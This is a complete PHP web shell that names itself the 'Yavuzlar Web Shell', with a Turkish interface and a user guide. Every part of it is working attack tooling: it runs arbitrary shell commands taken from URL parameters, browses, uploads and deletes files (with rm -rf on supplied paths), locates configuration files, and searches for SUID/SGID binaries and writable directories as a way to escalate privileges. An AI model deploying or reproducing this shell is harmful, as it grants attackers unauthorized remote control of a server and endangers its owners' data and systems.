<?php
$systemInfo = getSystemVersion();
$host = getHost() . ":" . getPort();
$system = execCommand("uname -a");
$userid = execCommand("id");
$pwd = pwd();
$activeForm = getURLVar('activeForm');
function getURLVar($var) {
    return isset($_GET[$var]) ? $_GET[$var] : null;
}
function execCommand($command) {
    return shell_exec($command);
}
function pwd() {
    return execCommand("pwd");
}
function getPort() {
    return isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'UnknownPort';
}
function getHost() {
    return isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'UnknownHost';
}
function getSystemVersion() {
    if (isset($_SERVER['SERVER_SOFTWARE'])) {
        return $_SERVER['SERVER_SOFTWARE'];
    } else {
        return 'UnknownServSoftware';
    }
}

if (getURLVar("action") == "command" && getURLVar("command")) {
    $execCommandOutput = execCommand(getURLVar("command"));
}

if (getURLVar("action") == "manageFile") {
    $directory = getURLVar("directory") ? getURLVar("directory") : ".";
    $commandOutput = execCommand("ls -la " . $directory);
    $fileArray = preg_split('/\s+/', trim($commandOutput));
    array_splice($fileArray, 0, 2);

    $completeArray = [];
    $keys = ['permissions', 'links', 'owner', 'group', 'size', 'month', 'day', 'time', 'name'];
    
    for ($i = 0; $i < count($fileArray); $i += 9) {
        $fileDetails = array_slice($fileArray, $i, 9);
        if (count($fileDetails) == 9) {
            $fileAssocArray = array_combine($keys, $fileDetails);
            $completeArray[] = $fileAssocArray;
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['deletedFileName'])) {
    $filePath = $_POST['deletedFileName'];
    $filePerm = $_POST['deletedFilePerm'];
    if (strpos($filePerm, 'd') === 0) {
        $deleteCommand = "rm -rf $filePath";
    } else {
        $deleteCommand = "rm $filePath";
    }
    shell_exec($deleteCommand);
}

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["action"]) && $_POST["action"] == "submit") {
    $directory = getURLVar("directory") ? getURLVar("directory") : ".";
    if (isset($_FILES["file"]) && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
        move_uploaded_file($_FILES["file"]["tmp_name"], $directory . '/' . basename($_FILES["file"]["name"]));
    }
}

if (getURLVar("action") == "findConf") {
    $directory = getURLVar("directory") ? getURLVar("directory") : ".";
    $findConfCommandOutput = execCommand("find " . $directory . " -name '*.cfg' -o -name '*.conf' -o -name '*.cnf'");
}

if (getURLVar("action") == "findFile") {
    $directory = getURLVar("directory") ? getURLVar("directory") : ".";
    $file = getURLVar("file") ? getURLVar("file") : "*";
    $findFileCommandOutput = execCommand("find " . $directory . " -name ".$file);
}
if (getURLVar("action") == "commonCommands") {
    $command = getURLVar("command");
    if ($command === "SUID"){
        $commonCommandOutput = execCommand("find / -perm /u=s -ls 2>/dev/null");
    }
    else if ($command === "SGID"){
        $commonCommandOutput = execCommand("find / -perm /g=s -ls 2>/dev/null");
    }
    else if ($command === "writePermissions"){
        $commonCommandOutput = execCommand("find / -type d -maxdepth 10 -writable -printf '%T@ %Tc | %p \n' 2>/dev/null | grep -v '| /proc' | grep -v '| /dev' | grep -v '| /run' | grep -v '| /var/log' | grep -v '| /boot'  | grep -v '| /sys/' | sort -n -r");
    }
    else if ($command === "readPermissions"){
        $commonCommandOutput = execCommand("find / -type d -maxdepth 4 -readable -printf '%T@ %Tc | %p \n' 2>/dev/null | grep -v '| /proc' | grep -v '| /dev' | grep -v '| /run' | grep -v '| /var/log' | grep -v '| /boot'  | grep -v '| /sys/' | sort -n -r");
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #1a1a1a;
            color: #33ff33;
            font-family: 'Courier New', Courier, monospace;
            font-size: 16px;
        }

        button, input[type="submit"], input[type="file"] {
            background-color: #333;
            color: #33ff33;
            border: 1px solid #33ff33;
            padding: 10px;
            font-family: inherit;
            font-size: inherit;
            cursor: pointer;
            transition: background-color 0.3s ease, color 0.3s ease;
        }

        button:hover, input[type="submit"]:hover, input[type="file"]:hover {
            background-color: #444;
            color: #ffffff;
        }

        form {
            background-color: #222;
            border: 2px solid #33ff33;
            padding: 20px;
            margin-bottom: 20px;
        }

        textarea {
            background-color: #000;
            color: #33ff33;
            border: 1px solid #33ff33;
            width: 100%;
            height: 300px;
            padding: 10px;
            font-family: inherit;
        }

        .info {
            background-color: #333;
            padding: 20px;
            border: 2px solid #33ff33;
        }

        .hostnameLabel {
            font-weight: bold;
            color: #33cc33;
        }

        ul {
            list-style-type: none;
            padding-left: 0;
        }

        li {
            background-color: #222;
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #33ff33;
        }

        a {
            color: #33ff33;
            text-decoration: none;
        }

        a:hover {
            color: #ffffff;
        }

        h3 {
            color: #33cc33;
        }

        pre.logo {
            font-size: 20px;
            color: #33ff33;
            text-align: center;
        }

        input[type="text"] {
            background-color: #000;
            color: #33ff33;
            border: 1px solid #33ff33;
            padding: 10px;
            font-family: inherit;
        }
    </style>
</head>
    <body>
        <pre class="logo">
           _____.___.                        .__                
           \__  |   |____ ___  ____ _________|  | _____ _______ 
            /   |   \__  \\  \/ /  |  \___   /  | \__  \\_  __ \
            \____   |/ __ \\   /|  |  //    /|  |__/ __ \|  | \/
            / ______(____  /\_/ |____//_____ \____(____  /__|   
            \/           \/                 \/         \/        
                            
        </pre>

        <div class="info">
            <label class="hostnameLabel">Host: <?php echo $host ?></label><br></br>
            <label for="phpVersion">Sistem Versiyonu: <?php echo $systemInfo ?></label><br></br>
            <label id="system">Sistem Bilgisi: <?php echo $system ?></label><br></br>
            <label id="userID">Kullanıcı ID: <?php echo $userid ?></label><br></br>
            <label id="pwd">Bulunan Dizin: <?php echo $pwd ?></label><br></br>
        </div>

        <button id="showExecBtn" onclick="showForm('formExec')">Komut Çalıştır</button>
        <button id="showFileManageBtn" onclick="showForm('formFileManage', 'formUploadFile', 'fileList')">Dosya Yönetimi</button>
        <button id="showFindConfBtn" onclick="showForm('formFindConf')">Konfigurasyon Dosyası Bul</button>
        <button id="showFindFileBtn" onclick="showForm('formfindFile')">Dosya Bul</button>
        <button id="showCommonCommandsBtn" onclick="showForm('formCommonCommands')">Sık Kullanılan Komutlar</button>
        <button id="showHelpBtn" onclick="showForm('formHelp')">?</button>
    
        <form id="formExec" style="display:none;" method="GET">
            <input hidden value="command" name="action">
            <input hidden value="formExec" name="activeForm">
            <input type="text" placeholder="Komut" name="command">
            <input type="submit" value="Exec">
            <textarea id="execOutput" readonly><?php echo isset($execCommandOutput) ? $execCommandOutput : '' ?></textarea>
        </form>

        <form id="formFileManage" style="display:none;" method="GET">
            <input hidden value="manageFile" name="action">
            <input hidden value="formFileManage" name="activeForm">
            <input type="text" placeholder="Dizin" name="directory">
            <button id="showFiles">Dosyaları Göster</button>
        </form>
        <form id="formUploadFile" style="display:none;" method="POST" enctype="multipart/form-data">
            <input hidden value="submit" name="action">
            <input type="file" name="file">
            <input type="submit" value="Dosya Yükle">
        </form>
        <div id="fileList" style="display:none;">
            <h3>Dosya Listesi:</h3>
            <ul>
                <?php if (!empty($completeArray)) :?>
                    <?php foreach ($completeArray as $fileDetails) : ?>
                        <li>
                            <?php if (strpos($fileDetails['permissions'], 'd') === 0) : ?>
                                <strong>Dosya Adı:</strong>
                                <a href="?action=manageFile&activeForm=formFileManage&directory=<?php echo $directory?>/<?php echo $fileDetails['name']; ?>">
                                    <?php echo $fileDetails['name']; ?>
                                </a><br>
                            <?php else: ?>
                                <strong>Dosya Adı:</strong> <?php echo $fileDetails['name']; ?><br>
                            <?php endif; ?>
                            <strong>İzinler:</strong> <?php echo $fileDetails['permissions']; ?><br>
                            <strong>Sahip:</strong> <?php echo $fileDetails['owner']; ?><br>
                            <strong>Grup:</strong> <?php echo $fileDetails['group']; ?><br>
                            <form id="formDeleteFile" method="POST">
                                <input type="hidden" name="deletedFileName" value="<?php echo $directory?>/<?php echo $fileDetails['name']; ?>">
                                <input type="hidden" name="deletedFilePerm" value="<?php echo $fileDetails['permissions']; ?>">
                                <button id="deleteFile">Dosyayı Sil</button>
                            </form>
                        </li>
                        <hr>
                    <?php endforeach; ?>
                <?php endif; ?>
            </ul>
        </div>

        <form id="formFindConf" style="display:none;" method="GET">
            <input hidden value="findConf" name="action">
            <input hidden value="formFindConf" name="activeForm">
            <input type="text" placeholder="Dizin" name="directory">
            <input type="submit" value="Ara">
            <textarea id="findConfOutput" readonly><?php echo isset($findConfCommandOutput) ? $findConfCommandOutput : '' ?></textarea>
        </form>

        <form id="formfindFile" style="display:none;" method="GET">
            <input hidden value="findFile" name="action">
            <input hidden value="formfindFile" name="activeForm">
            <input type="text" placeholder="Dosya Adı" name="file">
            <input type="text" placeholder="Dizin Adı" name="directory">
            <input type="submit" value="Ara">
            <textarea id="findFileOutput" readonly><?php echo isset($findFileCommandOutput) ? $findFileCommandOutput : '' ?></textarea>
        </form>

        <form id="formCommonCommands" style="display:none;" method="GET">
            <input hidden value="commonCommands" name="action">
            <input hidden value="formCommonCommands" name="activeForm">
            <button type="submit" name="command" value="SUID">SUID Bul</button>
            <button type="submit" name="command" value="SGID">SGID Bul</button>
            <button type="submit" name="command" value="readPermissions">Okuma Yetkisi Olan Dosyalar</button>
            <button type="submit" name="command" value="writePermissions">Yazma Yetkisi Olan Dosyalar</button>
            <textarea id="commonCommandOutput" readonly><?php echo isset($commonCommandOutput) ? $commonCommandOutput : '' ?></textarea>
        </form>

        <form id="formHelp" style="display:none;" method="GET">
            <input hidden value="help" name="action">
            <input hidden value="formHelp" name="activeForm">
            <textarea id="helpOutput" readonly>
                Yavuzlar Web Shell Kullanım Kılavuzu

                Anasayfa
                Webshell açılınca karşılaşılan ilk sayfa, burada sistem hakkında host, server versiyonu, sistem bilgisi, kullanıcı adı ve id' si, ve dosyanın çalıştığı dizin bilgileri gösterilmektedir.

                Komut Çalıştır:
                Komut çalıştır sayfa üzerinden sistem içinde linux komutları çalıştırılabilir.

                Dosya Yönetimi:
                Dosya yönetimi üzerinden istenilen bir dizinde veya default olarak bulunan dizindeki dosyaları görebiliriz ve dizinler arasında ilerleyebiliriz. Eğer listede dizin bulunuyorsa o dizinin ismine tıklayarak alt dosyalarına erişilebilir. 

                Dosya Silme:
                Kullanıcının yetkisi olduğu sürece bulunan dizindeki dosyaları silebilir.

                Dosya yükleme:
                Kullanıcı yetkisinin olduğu bütün dizinlere dosya yüklemesi yapabilir.
                (yüklenen dosyanın listede gözükmesi için sayfanın yenilenmesi gerekir.)

                Konfigurasyon Dosyası Bul:
                Girilen dizin üzerindeki bütün .conf .cnf ve .cfg uzantılı dosyaları sıralar.

                Dosya Bul:
                Verilen dosya adı ve dizin içerisinde dosya araması yapar.

                Sık Kullanılan Komutlar:
                Bu sayfa içerisinde kullanıcının SUID, SGID, okuma yetkisine ve yazma yetkisine sahip olduğu dosyaları listelenir.

                Yardım:
                "?" Butonu üzerinden bu kılavuz görüntülenir 
            </textarea>
        </form>

        <script>
        function showForm(...formIds) {
            const allForms = ['formExec', 'formFileManage', 'formUploadFile', 'fileList', 'formFindConf', 'formfindFile', 'formCommonCommands', 'formHelp'];
            allForms.forEach(function(formId) {
                document.getElementById(formId).style.display = 'none';
            });
            formIds.forEach(function(formId) {
                document.getElementById(formId).style.display = 'block';
            });
        }

        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            const activeForm = urlParams.get('activeForm') || '<?php echo $activeForm ?>';

            if (activeForm) {
                if (activeForm === 'formExec') showForm('formExec');
                else if (activeForm === 'formFileManage') showForm('formFileManage', 'formUploadFile', 'fileList');
                else if (activeForm === 'formFindConf') showForm('formFindConf');
                else if (activeForm === 'formfindFile') showForm('formfindFile');
                else if (activeForm === 'formCommonCommands') showForm('formCommonCommands');
                else if (activeForm === 'formHelp') showForm('formHelp');
            }
        }
        </script>
    </body>
</html>